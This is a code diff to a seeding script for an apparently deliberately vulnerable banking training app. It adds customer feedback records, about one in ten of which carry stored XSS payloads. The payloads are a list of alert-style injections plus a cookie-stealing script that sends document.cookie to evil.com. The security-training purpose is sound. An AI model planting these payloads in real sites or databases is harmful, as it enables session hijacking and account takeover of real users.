@@ -11,7 +11,7 @@ from datetime import datetime, timedelta
 from decimal import Decimal
 from faker import Faker
 from app import create_app
-from models import db, User, Transaction
+from models import db, User, Transaction, Feedback
 
 # Initialize Faker for generating realistic sample data
 fake = Faker()
@@ -38,6 +38,66 @@ TRANSACTION_CATEGORIES = [
     'Healthcare', 'Travel', 'Groceries', 'Technology', 'Education', 'Fitness',
     'Clothing', 'Home & Garden', 'Automotive', 'Insurance', 'Banking'
 ]
+
+
+# Sample feedback messages with different sentiment levels
+FEEDBACK_TEMPLATES = {
+    5: [  # Excellent (5 stars)
+        "Outstanding service! The mobile app is intuitive and the customer support team went above and beyond to help me.",
+        "I've been banking here for years and the service keeps getting better. <b>Highly recommend!</b>",
+        "Exceptional experience from start to finish. The staff is knowledgeable and always friendly.",
+        "Best banking experience I've ever had. The online portal makes everything so easy!",
+        "Five stars! Quick responses, great rates, and excellent customer service.",
+        "<i>Amazing</i> digital banking features and the support team is fantastic!"
+    ],
+    4: [  # Good (4 stars)
+        "Great bank overall. The app could use some improvements but the service is solid.",
+        "Very satisfied with most aspects. Customer service is excellent, just wish the fees were lower.",
+        "Good experience overall. The ATM network is extensive and staff is helpful.",
+        "Happy with the service. <b>Professional staff</b> and reasonable rates.",
+        "Solid banking experience. A few minor issues but nothing major.",
+        "Good service and reliable. Would recommend to others."
+    ],
+    3: [  # Average (3 stars)
+        "Average experience. Nothing special but gets the job done.",
+        "Decent service but room for improvement in response times.",
+        "OK bank. Some good features but the interface could be better.",
+        "Middle of the road experience. Service is adequate.",
+        "It's fine. Not the best, not the worst. Average banking experience.",
+        "Acceptable service level. Could be better but meets basic needs."
+    ],
+    2: [  # Poor (2 stars)
+        "Disappointing service. Long wait times and unhelpful staff.",
+        "Expected better. The mobile app frequently has issues and customer service is slow.",
+        "Below average experience. Multiple problems with account access.",
+        "Not impressed. Communication could be much better.",
+        "Poor response times and several technical issues with online banking.",
+        "Frustrating experience with multiple service failures."
+    ],
+    1: [  # Very Poor (1 star)
+        "Terrible experience. Constant system outages and poor customer support.",
+        "Worst banking experience ever. Would not recommend to anyone.",
+        "Extremely disappointed. Multiple issues that were never resolved properly.",
+        "Awful service. Switching to another bank as soon as possible.",
+        "Completely unsatisfied. Nothing but problems since opening my account.",
+        "Very poor service quality. Numerous unresolved issues."
+    ]
+}
+
+# XSS Payloads for security training (INTENTIONAL VULNERABILITIES)
+XSS_PAYLOADS = [
+    "<script>alert('XSS Vulnerability Found!');</script>",
+    "<img src=x onerror=alert('Image XSS')>",
+    "<b onmouseover=alert('Mouse XSS')>Hover over this text</b>",
+    "Great service! <script>console.log('XSS logged');</script>",
+    "<iframe src='javascript:alert(\"Iframe XSS\")'></iframe>",
+    "Love the bank! <svg onload=alert('SVG XSS')>",
+    "<input type='text' onfocus=alert('Input XSS') autofocus>",
+    "Excellent! <div style='width:expression(alert(\"CSS XSS\"))'>",
+    "<marquee onstart=alert('Marquee XSS')>Scrolling text</marquee>",
+    "Good bank <body onload=alert('Body XSS')>"
+]
+
 
 def check_existing_data():
     """
@@ -243,10 +303,308 @@ def create_transactions_for_user(user, transaction_count=None):
     
     return transactions
 
+def create_feedback_for_users(users):
+    """
+    Create feedback entries for users with realistic distribution and some XSS payloads for training
+    Returns list of created feedback entries
+    """
+    print("\n3️⃣ Creating customer feedback...")
+    
+    all_feedback = []
+    
+    # Determine how many users will leave feedback (60-80% of users)
+    feedback_percentage = random.uniform(0.6, 0.8)
+    num_feedback_users = int(len(users) * feedback_percentage)
+    
+    # Randomly select users who will leave feedback
+    feedback_users = random.sample(users, num_feedback_users)
+    
+    print(f"  Generating feedback from {num_feedback_users}/{len(users)} users...")
+    
+    for i, user in enumerate(feedback_users):
+        # Each user might leave 1-3 feedback entries over time
+        num_feedback = random.choices([1, 2, 3], weights=[70, 25, 5])[0]
+        
+        for feedback_num in range(num_feedback):
+            feedback = create_single_feedback(user, feedback_num)
+            if feedback:
+                all_feedback.append(feedback)
+        
+        if (i + 1) % 10 == 0:
+            print(f"    Generated feedback for {i + 1}/{num_feedback_users} users...")
+    
+    # Add all feedback to the session
+    print(f"  Adding {len(all_feedback)} feedback entries to database...")
+    db.session.add_all(all_feedback)
+    db.session.commit()
+    
+    print(f"✓ Successfully created {len(all_feedback)} feedback entries")
+    return all_feedback
 
+
+def create_single_feedback(user, feedback_index=0):
+    """
+    Create a single feedback entry for a user
+    """
+    # Generate feedback date (spread over last 6 months, with recent bias)
+    end_date = datetime.now()
+    start_date = end_date - timedelta(days=180)
+    
+    # Weight recent dates more heavily
+    if random.random() < 0.4:  # 40% chance of very recent feedback (last 30 days)
+        feedback_date = fake.date_time_between(start_date=end_date - timedelta(days=30), end_date=end_date)
+    else:  # 60% chance of older feedback
+        feedback_date = fake.date_time_between(start_date=start_date, end_date=end_date)
+    
+    # Determine score with realistic distribution
+    # Most banks have higher ratings, so weight toward positive scores
+    score_weights = [5, 15, 20, 35, 25]  # Weights for scores 1, 2, 3, 4, 5
+    score = random.choices([1, 2, 3, 4, 5], weights=score_weights)[0]
+    
+    # 10% chance of including XSS payload for security training
+    include_xss = random.random() < 0.1
+    
+    if include_xss:
+        message = generate_xss_feedback_message(score)
+    else:
+        message = generate_normal_feedback_message(score)
+    
+    # 20% chance of anonymous feedback
+    is_anonymous = random.random() < 0.2
+    
+    try:
+        feedback = Feedback(
+            user_id=user.id,
+            score=score,
+            message=message,
+            created_at=feedback_date,
+            is_anonymous=is_anonymous
+        )
+        
+        return feedback
+        
+    except Exception as e:
+        print(f"Error creating feedback for user {user.id}: {e}")
+        return None
+
+
+def generate_normal_feedback_message(score):
+    """
+    Generate a normal feedback message based on the score
+    """
+    # Get base template for the score
+    base_message = random.choice(FEEDBACK_TEMPLATES[score])
+    
+    # 30% chance to add personalized details
+    if random.random() < 0.3:
+        personal_details = [
+            " The mobile app works perfectly on my phone.",
+            " I especially like the transaction search feature.",
+            " The customer service representative was very helpful.",
+            " The ATM locations are convenient for me.",
+            " Online banking saves me so much time.",
+            " The account dashboard is easy to navigate.",
+            " I appreciate the email notifications.",
+            " The security features give me peace of mind.",
+            " Transfer process is quick and simple.",
+            " The interest rates are competitive."
+        ]
+        
+        if score >= 4:
+            positive_details = [
+                " Keep up the excellent work!",
+                " This is why I recommend you to friends.",
+                " Much better than my previous bank.",
+                " The improvements over the years are noticeable.",
+                " Everything works exactly as expected."
+            ]
+            personal_details.extend(positive_details)
+        elif score <= 2:
+            negative_details = [
+                " I hope these issues get resolved soon.",
+                " This needs immediate attention.",
+                " I'm considering switching banks.",
+                " Very frustrating experience overall.",
+                " Multiple attempts to resolve this failed."
+            ]
+            personal_details.extend(negative_details)
+        
+        base_message += random.choice(personal_details)
+    
+    # 15% chance to add service-specific feedback
+    if random.random() < 0.15:
+        services = [
+            "loan application process",
+            "credit card services", 
+            "investment options",
+            "business banking features",
+            "international transfers",
+            "mortgage services",
+            "savings account benefits",
+            "checking account features"
+        ]
+        
+        service = random.choice(services)
+        if score >= 4:
+            base_message += f" The {service} exceeded my expectations."
+        elif score <= 2:
+            base_message += f" Had significant problems with the {service}."
+        else:
+            base_message += f" The {service} was adequate."
+    
+    # Ensure message doesn't exceed 500 characters
+    if len(base_message) > 500:
+        base_message = base_message[:497] + "..."
+    
+    return base_message
+
+
+def generate_xss_feedback_message(score):
+    """
+    Generate feedback message with XSS payload for security training
+    INTENTIONAL VULNERABILITY: These messages contain XSS payloads
+    """
+    # Start with a normal-looking message
+    normal_part = random.choice(FEEDBACK_TEMPLATES[score])
+    
+    # Select an XSS payload
+    xss_payload = random.choice(XSS_PAYLOADS)
+    
+    # Different ways to embed the XSS
+    embedding_methods = [
+        lambda normal, xss: f"{normal} {xss}",  # Append XSS
+        lambda normal, xss: f"{xss} {normal}",  # Prepend XSS  
+        lambda normal, xss: f"{normal[:len(normal)//2]} {xss} {normal[len(normal)//2:]}",  # Insert in middle
+        lambda normal, xss: xss,  # Just XSS payload
+        lambda normal, xss: f"{normal} <!-- {xss} -->",  # Hidden in comment
+    ]
+    
+    # Choose embedding method
+    embed_method = random.choice(embedding_methods)
+    message = embed_method(normal_part, xss_payload)
+    
+    # Some additional XSS variations
+    if random.random() < 0.3:
+        additional_xss = [
+            "<style>body{background:red;}</style>",
+            "javascript:alert('XSS')",
+            "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
+            "<link rel=stylesheet href=javascript:alert('CSS')>",
+            "<table background=javascript:alert('Table')>",
+        ]
+        message += " " + random.choice(additional_xss)
+    
+    # Ensure message doesn't exceed 500 characters
+    if len(message) > 500:
+        message = message[:497] + "..."
+    
+    return message
+
+
+def create_realistic_feedback_distribution():
+    """
+    Create additional feedback to ensure realistic score distribution
+    This helps demonstrate different XSS attack vectors
+    """
+    print("\n4️⃣ Adding diverse feedback examples...")
+    
+    # Get some random users for additional feedback
+    users = User.query.limit(10).all()
+    if not users:
+        return []
+    
+    special_feedback = []
+    
+    # Add some specific XSS examples for training purposes
+    xss_examples = [
+        {
+            'score': 5,
+            'message': "Excellent service! <img src='x' onerror='alert(\"Stored XSS in feedback!\")' />",
+            'is_anonymous': False
+        },
+        {
+            'score': 4, 
+            'message': "Great bank! <script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
+            'is_anonymous': True
+        },
+        {
+            'score': 3,
+            'message': "Average service. <svg onload='fetch(\"/api/stats\").then(r=>r.json()).then(d=>alert(JSON.stringify(d)))'>",
+            'is_anonymous': False
+        },
+        {
+            'score': 2,
+            'message': "Poor experience <iframe src='javascript:alert(\"Iframe XSS via feedback\")'></iframe>",
+            'is_anonymous': True
+        },
+        {
+            'score': 1,
+            'message': "<div onmouseover='alert(\"Event handler XSS\")'>Terrible service - hover to see issue</div>",
+            'is_anonymous': False
+        }
+    ]
+    
+    for i, example in enumerate(xss_examples):
+        if i < len(users):
+            user = users[i]
+            feedback_date = fake.date_time_between(start_date='-30d', end_date='now')
+            
+            feedback = Feedback(
+                user_id=user.id,
+                score=example['score'],
+                message=example['message'],
+                created_at=feedback_date,
+                is_anonymous=example['is_anonymous']
+            )
+            
+            special_feedback.append(feedback)
+    
+    # Add some feedback with HTML formatting (legitimate use that could be exploited)
+    html_examples = [
+        {
+            'score': 5,
+            'message': "Love the new features! <b>Outstanding</b> customer service and <i>excellent</i> mobile app.",
+            'is_anonymous': False
+        },
+        {
+            'score': 4,
+            'message': "Very happy with <u>all aspects</u> of the service. <b>Highly recommended!</b>",
+            'is_anonymous': False
+        },
+        {
+            'score': 3,
+            'message': "Good service overall. The <i>online banking</i> could be <b>improved</b> though.",
+            'is_anonymous': True
+        }
+    ]
+    
+    for i, example in enumerate(html_examples):
+        if i + len(xss_examples) < len(users):
+            user = users[i + len(xss_examples)]
+            feedback_date = fake.date_time_between(start_date='-60d', end_date='-30d')
+            
+            feedback = Feedback(
+                user_id=user.id,
+                score=example['score'],
+                message=example['message'],
+                created_at=feedback_date,
+                is_anonymous=example['is_anonymous']
+            )
+            
+            special_feedback.append(feedback)
+    
+    if special_feedback:
+        db.session.add_all(special_feedback)
+        db.session.commit()
+        print(f"✓ Added {len(special_feedback)} special feedback examples for security training")
+    
+    return special_feedback
+
+
+# Update the main populate_database function to include feedback creation
 def populate_database():
     """
-    Main function to populate the database with sample data
+    Main function to populate the database with sample data including feedback
     """
     print("=" * 60)
     print("Banking Security Training - Database Population Tool")
@@ -308,17 +666,32 @@ def populate_database():
             db.session.commit()
             print(f"    Committed batch {i//batch_size + 1}/{(len(all_transactions) + batch_size - 1)//batch_size}")
         
+        # Create feedback for users
+        feedback_entries = create_feedback_for_users(users)
+        
+        # Add special XSS examples for training
+        special_feedback = create_realistic_feedback_distribution()
+        
         print(f"\n✅ Database population completed successfully!")
         print(f"📊 Summary:")
         print(f"   Users created: {len(users)}")
         print(f"   Transactions created: {total_transactions}")
+        print(f"   Feedback entries created: {len(feedback_entries) + len(special_feedback)}")
         print(f"   Average transactions per user: {total_transactions // len(users)}")
+        print(f"   Average feedback per user: {(len(feedback_entries) + len(special_feedback)) / len(users):.1f}")
+        
+        # Show feedback distribution
+        feedback_stats = Feedback.get_score_distribution()
+        print(f"\n📈 Feedback Score Distribution:")
+        for score in range(5, 0, -1):
+            count = feedback_stats.get(score, 0)
+            print(f"   {score} stars: {count} reviews")
         
         # Return a random user for login testing
         test_user, test_password = random.choice(users_with_passwords)
         return {
             'email': test_user.email,
-            'password': test_password,  # We know this is one of the possible passwords
+            'password': test_password,
             'name': test_user.get_full_name(),
             'account_number': test_user.account_number
         }
@@ -328,7 +701,7 @@ def populate_database():
         print(f"Error type: {type(e).__name__}")
         db.session.rollback()
         return None
-
+    
 
 def display_login_info(user_info):
     """
